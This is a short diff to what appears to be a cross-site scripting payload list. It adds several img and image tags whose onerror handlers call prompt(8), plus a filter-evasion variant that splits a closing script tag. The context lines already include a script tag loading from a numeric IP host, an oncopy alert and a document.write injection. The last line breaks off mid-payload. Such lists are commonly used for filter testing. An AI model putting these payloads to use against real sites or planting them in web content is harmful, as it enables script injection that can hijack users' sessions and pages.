@@ -6,4 +6,8 @@ blaoejds222
 <script src=//3334957647/1>
 <x oncopy=alert(1)>copy this!
 <img src=xss onerror=document.write("qwer$#@!")>
-test123
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=p
